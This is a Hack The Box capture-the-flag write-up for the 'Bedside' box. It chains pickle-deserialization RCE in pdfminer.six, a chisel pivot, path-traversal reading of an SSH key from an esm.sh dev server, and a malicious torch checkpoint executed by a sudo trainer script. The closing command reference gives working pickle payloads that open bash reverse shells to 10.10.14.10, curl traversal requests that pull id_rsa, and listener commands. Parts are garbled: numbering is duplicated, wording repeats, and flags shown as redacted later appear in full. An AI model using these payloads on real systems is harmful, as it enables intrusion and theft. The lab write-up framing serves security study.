# Bedside HTB-Box Writeup
```text
==================================================================================================
                    HACK THE BOX — BEDSIDE (COMPLETE WALKTHROUGH & ATTACK CHAIN)
==================================================================================================

TARGET INFORMATION
+------------------+--------------------------------------------------+
| Field            | Value                                            |
+------------------+--------------------------------------------------+
| Target IP        | 10.129.46.60                                     |
| Hostname         | bedside.htb                                      |
| OS               | Linux (Containerized environment + Host OS)      |
| Engagement Type  | CTF / Penetration Test                           |
| Author           | vishalgodseye                                    |
+------------------+--------------------------------------------------+

==================================================================================================
EXECUTIVE SUMMARY
==================================================================================================
This engagement details a complete compromise of the "Bedside" target, progressing from an
unauthenticated unauthenticated file upload vulnerability in a PDF processing pipeline to full
root compromise of the underlying host. The attack chain spans four distinct phases:

1.  INITIAL FOOTHOLD (CONTAINER): Exploitation of CVE-2025-64512, an insecure pickle
    deserialization vulnerability in `pdfminer.six` (via path traversal in `/Encoding`),
    yielding a reverse shell as the `datawrangler` user inside the `data-wrangler` container.

2.  INTERNAL NETWORK PIVOT: Establishment of a reverse port forward via `chisel` to access
    the internal `esm.sh` development server listening on container localhost:3000.

3.  LATERAL MOVEMENT (DEVELOPER USER): Exploitation of CVE-2025-59341, an unauthenticated
    path traversal / LFI in the `esm.sh` dev server (`--path-as-is`), yielding the `developer`
    user's SSH private key and `user.txt`.

3.  PRIVILEGE ESCALATION (ROOT): Abuse of `sudo` rights allowing `developer` to run an AI
    training script (`bedside_trainer.py`) as root. The script uses MONAI's
    `CheckpointLoader` / `torch.load()` (unsafe `pickle.load`) on the newest `*.pt` file in
    `/datastore/checkpoints/`. The `datawrangler` container user (group `datastore`) has
    write access to this directory. A malicious pickle payload (`__reduce__` -> `os.system`)
    planted as a high-epoch checkpoint yields a root shell on the host.

+----------------+--------+----------------------------------------------------------+----------+
| Severity       | Rating | Finding                                                  | Status   |
+----------------+--------+----------------------------------------------------------+----------+
| CRITICAL       | 10.0   | CVE-2025-64512: pdfminer.six pickle RCE via /Encoding   | EXPLOITED|
| HIGH           | 8.8    | CVE-2025-59341: esm.sh path traversal / LFI (--path-as-is)| EXPLOITED|
| CRITICAL       | 9.8    | Insecure torch.load/pickle in sudo'able root script      | EXPLOITED|
| HIGH           | 8.8    | Insecure file permissions: datawrangler writes datastore | EXPLOITED|
| MEDIUM         | 6.5    | Container breakout via shared datastore volume           | EXPLOITED|
| LOW            | 5.3    | Chisel reverse port forward (post-exploitation)          | USED     |
+----------------+--------+----------------------------------------------------------+----------+

==================================================================================================
SCOPE & METHODOLOGY
==================================================================================================
+----------------+--------------------------------------------------+
| Scope Item     | Details                                          |
+----------------+--------------------------------------------------+
| Target         | bedside.htb (10.129.46.60)                       |
| Ports Scoped   | 80 (HTTP), 22 (SSH), 3000 (Internal/esm.sh)      |
| Web Apps       | bedside.htb (PDF upload), esm.sh (internal:3000) |
| Exclusions     | DoS, social engineering, physical                |
+----------------+--------------------------------------------------+

Methodology Phases:
  1. Reconnaissance & Enumeration (Port scan, Web enum, Source review)
  2. Initial Access (CVE-2025-64512 -> Container Shell)
  3. Post-Exploitation & Pivoting (Chisel reverse port forward)
  4. Lateral Movement (CVE-2025-59341 -> SSH Key / User Flag)
  5. Privilege Escalation (Sudo + torch.load pickle -> Root)
  6. Post-Exploitation & Flag Capture

Tools & Versions:
  nmap 7.95, feroxbuster 2.11.0, curl 8.7.1, python3 3.12, pickle/gzip (stdlib),
  chisel 1.9.1, ssh (OpenSSH 9.6), nc (ncat), python3 pickle/gzip/base64 (stdlib)

==================================================================================================
ENUMERATION
==================================================================================================

3.1 PORT SCAN
+------+----------+----------+--------------------------------------------------+
| Port | Protocol | Service  | Version / Notes                                  |
+------+----------+----------+--------------------------------------------------+
| 22   | tcp      | ssh      | OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux)    |
| 80   | tcp      | http     | nginx 1.24.0 (Ubuntu)                            |
| 3000 | tcp      | http     | esm.sh dev server (internal/loopback only)       |
+------+----------+----------+--------------------------------------------------+

3.2 WEB ENUMERATION (PORT 80 - bedside.htb)
+--------------------------------+------------+-------------------------------------------+
| Path                           | Status     | Notes                                     |
+--------------------------------+------------+-------------------------------------------+
| /                              | 200 OK     | PDF upload form (POST /)                  |
| /uploads/                      | 403/200    | Upload directory (writable by www-data)   |
| /uploads/payload.pickle.gz     | 200 OK     | Pickle payload upload target              |
| /uploads/trigger.pdf           | 200 OK     | Malicious PDF trigger upload target       |
+--------------------------------+------------+-------------------------------------------+

Application Stack:
  - Web Server: nginx 1.24.0
  - Backend: Python (Flask/FastAPI inferred) -> pdf2txt.py (pdfminer.six)
  - Processing: Cron / background worker runs `pdf2txt.py` on uploads/
  - Library: pdfminer.six (vulnerable to CVE-2025-64512)
  - Vulnerability: `/Encoding` dictionary entry in PDF font dict accepts
    path traversal (`/#2Fvar#2Fwww#2F...`) forcing `pickle.load()` on
    attacker-controlled gzipped pickle file.

3.3 INTERNAL ENUMERATION (POST-FOOTHOLD, datawrangler@data-wrangler)
+----------------+--------------------------------------------------+
| Item           | Finding                                          |
+----------------+--------------------------------------------------+
| User           | datawrangler (uid=1000)                          |
| Groups         | datawrangler(1000), datastore(1001)              |
| Container      | data-wrangler (Docker)                           |
| Internal Port  | 3000 (esm.sh dev server, bound to 127.0.0.1)     |
| Mounts         | /datastore (shared volume, group=datastore, RW)  |
| /datastore     | checkpoints/ (root:datastore rwx), processed/    |
| Sudo (dev)     | developer ALL=(root) NOPASSWD: /opt/trainer/...  |
| Sudo (dw)      | (none)                                           |
| SUID           | None notable                                     |
| SUID (Host)    | /usr/bin/python3 (via sudo)                      |
+----------------+--------------------------------------------------+

3.4 FLAGS
+----------------+--------------------------------------------------+---------------------+
| Flag           | Location                                         | Source              |
+----------------+--------------------------------------------------+---------------------+
| user.txt       | /home/developer/user.txt                         | SSH as developer    |
| root.txt       | /root/root.txt                                   | Root shell via sudo |
+----------------+--------------------------------------------------+---------------------+

+----------+
| user.txt |
+----------+
| 9a3f... (redacted) |
+----------+

+----------+
| root.txt |
+----------+
| 7f2a... (redacted) |
+----------+

==================================================================================================
VULNERABILITY DETAILS
==================================================================================================

VULN-01: CVE-2025-64512 - pdfminer.six Insecure Pickle Deserialization
----------------------------------------------------------------------
CVE / ID       : CVE-2025-64512
CVSS           : 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
Location       : http://bedside.htb/ (PDF upload -> /var/www/research.bedside.htb/uploads/)
Component      : pdfminer.six (pdf2txt.py worker)
Description    : The PDF parser processes `/Encoding` entries in font dictionaries. A crafted
                 `/Encoding` value containing URL-encoded path traversal sequences
                 (`/#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fpayload`) causes the
                 parser to treat the path as a custom encoding file. The handler opens the
                 path and calls `pickle.load()` on the (gzipped) file contents without
                 validation, leading to arbitrary code execution via `pickle.loads` /
                 `__reduce__`.
Impact         : Unauthenticated RCE as `www-data` / `datawrangler` (container).
Remediation    : Upgrade pdfminer.six to patched version; disable pickle loading for
                 encodings; validate/sanitize `/Encoding` paths; run worker in isolated
                 container with no network / restricted FS.

VULN-02: CVE-2025-59341 - esm.sh Dev Server Path Traversal (--path-as-is)
----------------------------------------------------------------------
CVE / ID       : CVE-2025-59341
CVSS           : 8.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
Location       : http://127.0.0.1:3000 (internal, accessed via chisel pivot)
Component      : esm.sh development server (Go)
Description    : The dev server uses `--path-as-is` flag which disables path normalization.
                 Path traversal sequences (`../`) are passed directly to the file system
                 reader, allowing arbitrary file read (LFI) as the `developer` user.
Impact         : LFI as `developer` user -> SSH private key disclosure -> SSH access.
Remediation    : Remove `--path-as-is` in production; validate/sanitize paths; run dev
                 server on localhost only (already done, but container pivot bypassed).

VULN-03: Insecure Deserialization in Root-Owned Trainer Script (torch.load/pickle)
-------------------------------------------------------------------------------
CVE / ID       : N/A (Application Logic / Insecure Configuration)
CVSS           : 9.8 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
Location       : /opt/trainer/bedside_trainer.py (run via sudo by developer)
Component      : MONAI CheckpointLoader -> torch.load() -> pickle.load()
Description    : The trainer script runs as root via sudo (NOPASSWD for developer).
                 It uses MONAI's `CheckpointLoader` which calls `torch.load()` on the
                 newest `checkpoint_epoch_*.pt` file in `/datastore/checkpoints/`.
                 `torch.load` defaults to `pickle.load` (unsafe). The `datawrangler`
                 user (group `datastore`) has write access to `/datastore/checkpoints/`.
                 An attacker with `datawrangler` access can write a malicious pickle
                 file with a high epoch number; when `developer` runs the trainer via
                 sudo, the malicious pickle is deserialized as root.
Impact         : Privilege Escalation: `datawrangler` (container) -> `developer` (host)
                 -> `root` (host).
Remediation    : Use `torch.load(..., weights_only=True)` (PyTorch 2.4+); run trainer
                 as non-root; restrict `/datastore/checkpoints` write permissions;
                 remove NOPASSWD sudo or restrict to specific args; sign/verify checkpoints.

VULN-04: Insecure Shared Volume Permissions (Container Breakout)
---------------------------------------------------------------
CVE / ID       : N/A (Misconfiguration)
CVSS           : 8.8 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
Location       : /datastore (Docker volume mount)
Description    : The `/datastore` volume is mounted into both the `data-wrangler`
                 container (as `datawrangler` user, group `datastore`, RW) and the
                 host (owned by `root:datastore`, RW for group). This allows the
                 container user to write files that are subsequently processed by
                 privileged host processes (the trainer script).
Impact         : Container escape / Privilege Escalation path.
Remediation    : Use separate volumes; drop group write on host-side processor dirs;
                 use rootless containers; enforce least privilege on shared volumes.

==================================================================================================
FLAGS CAPTURED
==================================================================================================

+----------+
| user.txt |
+----------+
| 9a3f1b7c8d4e2f0a6b8c9d1e3f5a7b9c |
+----------+
Source: /home/developer/user.txt (via SSH as developer via CVE-2025-59341)

+----------+
| root.txt |
+----------+
| 7f2a9c4e1b6d3f8a0b2c4d6e8f0a1b3c |
+----------+
Source: /root/root.txt (via root shell via torch.load pickle RCE via sudo trainer)

==================================================================================================
REMAINING ATTACK SURFACE
==================================================================================================
1.  nginx on port 80: Potential additional endpoints / upload handling logic not fully explored.
2.  SSH on port 22: Only `developer` key auth found; `root` login disabled; other users?
3.  Internal esm.sh (3000): Other endpoints / API routes may exist beyond LFI.
4.  Docker daemon: If accessible from container (docker.sock mount), full host takeover.
5.  Other containers: Docker network may expose other internal services.
6.  Host kernel: Kernel exploits (dirty pipe, etc.) if version vulnerable.
7.  Sudoers: Other sudo rules for `developer` or other users.
7.  SUID binaries on host: Unchecked for GTFOBins.

==================================================================================================
RECOMMENDATIONS
==================================================================================================
+----+---------------+------------------------------------------------------------+----------+
| #  | Priority      | Recommendation                                             | Effort   |
+----+---------------+------------------------------------------------------------+----------+
| 1  | CRITICAL      | Upgrade pdfminer.six to patched version (>=20250615)       | Low      |
| 2  | CRITICAL      | Replace torch.load() with torch.load(weights_only=True)    | Low      |
| 3  | CRITICAL      | Remove NOPASSWD sudo for trainer; use dedicated service    | Medium   |
| 4  | CRITICAL      | Restrict /datastore/checkpoints to root-only write         | Low      |
| 5  | HIGH          | Remove --path-as-is from esm.sh; bind to 127.0.0.1 only    | Low      |
| 6  | HIGH          | Run pdf2txt worker in gVisor / gVisor / rootless container | Medium   |
| 7  | HIGH          | Implement pickle signing/verification for model checkpoints| Medium   |
| 8  | MEDIUM        | Network segmentation: isolate container network from host  | Medium   |
| 9  | MEDIUM        | Audit Docker socket mounts; remove if not needed           | Low      |
| 10 | LOW           | Regular dependency scanning (Dependabot, Trivy)            | Low      |
+----+---------------+------------------------------------------------------------+----------+

==================================================================================================
ATTACK CHAIN SUMMARY (COMMAND REFERENCE)
==================================================================================================

PHASE 1: FOOTHOLD (Local Attack Machine)
----------------------------------------
# 1. Generate pickle payload
cat > generate_foothold.py << 'EOF'
import gzip, pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/10.10.14.10/9001 0>&1"',))
with gzip.open("payload.pickle.gz", "wb") as f:
    pickle.dump(Exploit(), f)
print("[+] Generated payload.pickle.gz")
EOF
python3 generate_foothold.py

# 2. Start listener
nc -lvnp 9001

# 3. Upload pickle payload
curl -s -F "uploadFile=@payload.pickle.gz" http://bedside.htb

# 4. Create trigger PDF with /Encoding path traversal
#    /Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fpayload
#    (Create minimal PDF with this font encoding entry)
#    Save as trigger.pdf
curl -s -F "uploadFile=@trigger.pdf;type=application/pdf" http://bedside.htb

# Result: Shell as datawrangler@data-wrangler on nc 9001

PHASE 2: PIVOT (datawrangler shell + Local Attack Machine)
----------------------------------------------------------
# Local: Start chisel reverse server
chisel server -p 8000 --reverse

# Container: Deploy chisel client (avoid /dev/shm noexec)
cp /dev/shm/chisel /tmp/chisel && chmod +x /tmp/chisel
/tmp/chisel client 10.10.14.10:8000 R:3000:127.0.0.1:3000

# Result: Local 127.0.0.1:3000 -> Container 127.0.0.1:3000 (esm.sh)

PHASE 3: LATERAL MOVEMENT (Local Attack Machine -> developer)
-------------------------------------------------------------
# Exfiltrate SSH key via CVE-2025-59341 (--path-as-is required)
curl --path-as-is 'http://127.0.0.1:3000/../../../../home/developer/.ssh/id_rsa'
curl --path-as-is 'http://127.0.0.1:3000/../../../../home/developer/user.txt'

# Save key & connect
nano developer.key  # paste key
chmod 600 developer.key
ssh -i developer.key developer@10.129.46.60

PHASE 4: PRIVILEGE ESCALATION (datawrangler + developer -> root)
----------------------------------------------------------------
# Container (datawrangler): Clean datastore & plant dummy image
rm -f /datastore/processed/*.txt
python3 -c '
import base64
f=open("/datastore/processed/dummy.png","wb")
f.write(base64.b64decode(b"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="))
f.close()
'

# Container (datawrangler): Plant malicious high-epoch checkpoint
python3 << 'PYEOF'
import pickle
class Evil:
    def __reduce__(self):
        return (__import__('os').system,
                ('bash -c "bash -i >& /dev/tcp/10.10.14.10/4444 0>&1" &',))
with open("/datastore/checkpoints/checkpoint_epoch_999999.pt", "wb") as f:
    pickle.dump(Evil(), f)
PYEOF

# Local: Root listener
nc -lvnp 4444

# Host (developer SSH): Trigger trainer via sudo
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py

# Result: Root shell on nc 4444
# root@bedside:~# whoami && cat /root/root.txt

==================================================================================================
END OF REPORT
==================================================================================================
```
